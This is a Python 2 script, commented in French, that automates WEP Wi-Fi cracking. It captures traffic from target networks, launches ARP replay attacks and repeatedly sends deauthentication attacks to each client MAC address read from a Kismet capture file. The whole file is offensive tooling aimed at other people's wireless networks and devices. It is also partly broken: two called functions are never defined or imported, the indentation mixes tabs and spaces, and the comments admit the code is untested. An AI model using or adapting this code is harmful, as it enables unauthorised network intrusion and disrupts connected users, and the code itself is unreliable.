#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import network_listening, arp_attack
import xml.etree.ElementTree as ET
import os
import signal
import time

class ListeningManager():
    """docstring for ListeningManager"""
    def __init__(self, maxListening = 1):
        self.maxListening = maxListening
        self.listeningList = []
        self.networkTable = []

    def updateNetworkTable(self, table):
        self.networkTable = table

    def updateListening(self):
        tmpTable = self.networkTable[:self.maxListening]
        for network in tmpTable:
            tmp_network = WEPListening(network)
            if tmp_network not in self.listeningList:
                self.listeningList.append(tmp_network)
                tmp_network.startListening()

        """
        TODO: Retirer les réseaux en trop dans la liste
        # Code non testé !!!
        for network in self.listeningList:
            if network.box not in tmpTable:
                index = self.listeningList.index(network)
                self.listeningList.pop(index)
                network.stopListening()
        """

        print "Content of the ListeningList :"
        for x in self.listeningList:
            print x

    def display(self):
        print "Content of the ListeningManager :"
        for x in self.networkTable:
            print x

    def destroy(self):
        for listen in self.listeningList:
            listen.stopListening()


class WEPListening():
    """docstring for WEPListening"""
    def __init__(self, box):
        self.box = box
        self.focus_listen_pid = -1
        self.arp_pid = -1

    def startListening(self):
        print "Starting... %s" % (self.box)
        self.focus_listen_pid = network_listening(self.box)
        self.arp_pid = arp_attack(self.box)
	self.speed_up_process(self.box)

	""" forte probabilité de necessite de debugger ce code
		process de deauthentification pour accelerer l'obtiention d'iv
	"""
    def speed_up_process(self, box):
	print "Starting deauthentification_attack ... %s" % (self.box)
	tab_client = []
	dir_name = "TestBox"
	nom_ecoute = "record"
	path = dir_name + "/" + box._ESSID
	nom_fichier_xml_ecoute_local = path + "/" + nom_ecoute + "-01.kismet.netxml"
	sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
	sub_root = sub_tree.getroot()
	for child in sub_root:
	    for c_tmp in child.findall('wireless-client'):
		mac_client = c_tmp.find('client-mac').text
		client = client_wifi(mac_client)
		tab_client.append(client)
	for i in xrange(10) :
	    for client in tab_client :
		deauthentification_attack(self.box, client)
		time.sleep(5)

    def stopListening(self):
        print "Stoping... %s" % (self.box)
        os.killpg(self.focus_listen_pid, signal.SIGTERM)
        os.killpg(self.arp_pid, signal.SIGTERM)

    def __eq__(self, other):
        return self.box == other.box
